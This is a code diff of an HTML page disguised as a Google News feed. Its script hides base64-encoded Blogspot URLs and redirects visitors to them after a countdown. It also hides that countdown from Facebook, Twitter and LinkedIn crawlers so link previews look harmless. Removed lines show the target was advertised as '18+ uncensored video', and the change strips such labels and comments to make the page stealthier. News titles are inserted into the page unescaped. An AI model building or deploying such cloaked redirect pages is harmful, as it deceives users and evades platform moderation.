@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Latest News - Google News</title>
+    <title>News Updates</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
@@ -12,18 +12,24 @@
             background: #f0f2f5;
             color: #333;
         }
-        .container {
+        .simple-countdown {
+            text-align: center;
+            background: #ff4444;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        .countdown-number {
+            font-size: 2rem;
+            font-weight: bold;
+            margin: 5px 0;
+        }
+        .news-container {
             background: white;
             padding: 20px;
             border-radius: 10px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        .header {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .news-container {
-            margin: 20px 0;
         }
         .news-item {
             background: #f8f9fa;
@@ -43,140 +49,116 @@
             display: flex;
             justify-content: space-between;
         }
-        
-        .countdown-section {
-            background: #ff4444;
-            padding: 20px;
-            border-radius: 10px;
-            text-align: center;
-            margin-top: 20px;
-            color: white;
-        }
-        .wait-message {
-            font-size: 1.5rem;
-            font-weight: bold;
-            margin-bottom: 10px;
-        }
-        .target {
-            background: white;
-            color: #333;
-            padding: 10px 20px;
-            border-radius: 20px;
-            display: inline-block;
-            margin: 10px 0;
-            font-weight: bold;
-        }
-        .countdown {
-            font-size: 3rem;
-            font-weight: bold;
-            margin: 15px 0;
-        }
-        .redirect-message {
-            margin-top: 10px;
-        }
-        
         .loading {
             text-align: center;
             padding: 20px;
-        }
-        
-        .subdomain-info {
-            background: #e9ecef;
-            padding: 10px;
-            border-radius: 8px;
-            margin: 10px 0;
-            text-align: center;
-            font-family: monospace;
+            color: #666;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>📰 Latest News</h1>
-            <p>Real-time updates from Google News</p>
-        </div>
-        
-        <div class="subdomain-info" id="subdomain-info">
-            Access from: <span id="current-subdomain">Loading...</span>
-        </div>
-        
-        <div class="news-container" id="news-container">
-            <div class="loading">Loading latest news...</div>
-        </div>
-        
-        <div class="countdown-section" id="countdown-section">
-            <div class="wait-message">Please wait 7 seconds</div>
-            <div class="target">Uncensored Video Only 18+</div>
-            <div class="countdown" id="countdown">7</div>
-            <p class="redirect-message">Automatic redirect in progress...</p>
+    
+    <div class="simple-countdown" id="countdown-section">
+        <div>Please wait</div>
+        <div class="countdown-number" id="countdown">7</div>
+        <div>Redirecting to content...</div>
+    </div>
+
+    
+    <div class="news-container">
+        <h2 style="text-align: center; margin-bottom: 20px;">📰 Latest News</h2>
+        <div id="news-container">
+            <div class="loading">Loading latest news from Google...</div>
         </div>
     </div>
 
     <script>
-        // 🎯 DOMAIN THẬT CỦA BẠN
+        
         const ENCRYPTED_TARGETS = [
             'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWJyb2FkY2FzdC5odG1s',
             'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWNhbS5odG1s'
         ];
 
-        // 🎯 LẤY SUBDOMAIN HIỆN TẠI TỪ VERCEL
-        function getCurrentSubdomain() {
-            const hostname = window.location.hostname;
-            const parts = hostname.split('.');
-            
-            if (parts.length >= 3 && parts[1].includes('xbling')) {
-                return parts[0];
-            }
-            return 'main';
-        }
-
-        // 🎲 GIẢI MÃ DOMAIN THẬT
+        
         function decryptTarget(encrypted) {
             return atob(encrypted);
         }
 
-        // 🎲 CHỌN TARGET NGẪU NHIÊN TỪ 2 LINK BASE64
+       
         function getRandomTarget() {
             const randomIndex = Math.floor(Math.random() * ENCRYPTED_TARGETS.length);
-            const encryptedTarget = ENCRYPTED_TARGETS[randomIndex];
-            return decryptTarget(encryptedTarget);
+            return decryptTarget(ENCRYPTED_TARGETS[randomIndex]);
         }
 
-        // 🛡️ PHÁT HIỆN FACEBOOK BOT
+        
         function isFacebookBot() {
             return /facebookexternalhit|Facebot|Twitterbot|LinkedInBot/i.test(navigator.userAgent);
         }
 
-        // 📡 GOOGLE NEWS RSS
+        
         async function loadGoogleNews() {
             try {
+               
                 const rssUrl = 'https://news.google.com/rss?hl=en-US&gl=US&ceid=US:en';
-                const proxyUrl = 'https://corsproxy.io/?';
-                const response = await fetch(proxyUrl + encodeURIComponent(rssUrl));
                 
+                const response = await fetch(`https://api.rss2json.com/v1/api.json?rss_url=${encodeURIComponent(rssUrl)}`);
+                const data = await response.json();
+                
+                if (data.items && data.items.length > 0) {
+                    let newsHTML = '';
+                    const newsCount = Math.min(data.items.length, 10);
+                    
+                    for (let i = 0; i < newsCount; i++) {
+                        const item = data.items[i];
+                        newsHTML += `
+                            <div class="news-item">
+                                <div class="news-title">${item.title}</div>
+                                <div class="news-meta">
+                                    <span>Google News</span>
+                                    <span>${new Date(item.pubDate).toLocaleDateString()}</span>
+                                </div>
+                            </div>
+                        `;
+                    }
+                    
+                    document.getElementById('news-container').innerHTML = newsHTML;
+                } else {
+                    throw new Error('No news items');
+                }
+                
+            } catch (error) {
+                console.log('RSS failed, using direct fetch...');
+               
+                loadGoogleNewsDirect();
+            }
+        }
+
+       
+        async function loadGoogleNewsDirect() {
+            try {
+                const rssUrl = 'https://news.google.com/rss?hl=en-US&gl=US&ceid=US:en';
+                const response = await fetch(`https://cors-anywhere.herokuapp.com/${rssUrl}`);
                 const xmlText = await response.text();
-                const parser = new DOMParser();
-                const xmlDoc = parser.parseFromString(xmlText, "text/xml");
-                const items = xmlDoc.getElementsByTagName("item");
                 
+                // Parse XML manually
+                const items = xmlText.match(/<item>[\s\S]*?<\/item>/g) || [];
                 let newsHTML = '';
                 const newsCount = Math.min(items.length, 8);
                 
                 for (let i = 0; i < newsCount; i++) {
                     const item = items[i];
-                    const title = item.getElementsByTagName("title")[0]?.textContent || 'No title available';
-                    const pubDate = item.getElementsByTagName("pubDate")[0]?.textContent || '';
-                    const source = item.getElementsByTagName("source")[0]?.textContent || 'Google News';
+                    const titleMatch = item.match(/<title>([\s\S]*?)<\/title>/);
+                    const pubDateMatch = item.match(/<pubDate>([\s\S]*?)<\/pubDate>/);
                     
-                    const formattedDate = pubDate ? new Date(pubDate).toLocaleDateString('en-US') : 'Today';
+                    const title = titleMatch ? titleMatch[1].replace(/<![^>]*>/g, '').trim() : 'No title';
+                    const pubDate = pubDateMatch ? pubDateMatch[1] : '';
                     
                     newsHTML += `
                         <div class="news-item">
                             <div class="news-title">${title}</div>
                             <div class="news-meta">
-                                <span>${source}</span>
-                                <span>${formattedDate}</span>
+                                <span>Google News</span>
+                                <span>${pubDate ? new Date(pubDate).toLocaleDateString() : 'Today'}</span>
                             </div>
                         </div>
                     `;
@@ -185,22 +167,16 @@
                 document.getElementById('news-container').innerHTML = newsHTML;
                 
             } catch (error) {
-                document.getElementById('news-container').innerHTML = '<div class="loading">News updates available</div>';
+                console.log('All RSS methods failed');
+                document.getElementById('news-container').innerHTML = 
+                    '<div class="loading">Latest news from Google</div>';
             }
         }
 
-        // ⏱️ COUNTDOWN SYSTEM - 7 GIÂY
+       
         function startCountdown() {
-            const currentSubdomain = getCurrentSubdomain();
-            const targetSite = getRandomTarget();
-            
-            // Hiển thị subdomain hiện tại
-            document.getElementById('current-subdomain').textContent = currentSubdomain;
-            
-            // Ẩn countdown với Facebook bot
             if (isFacebookBot()) {
                 document.getElementById('countdown-section').style.display = 'none';
-                document.getElementById('subdomain-info').style.display = 'none';
                 return;
             }
             
@@ -213,6 +189,7 @@
                 
                 if (seconds <= 0) {
                     clearInterval(timer);
+                    const targetSite = getRandomTarget();
                     window.location.href = targetSite;
                 }
             }, 1000);
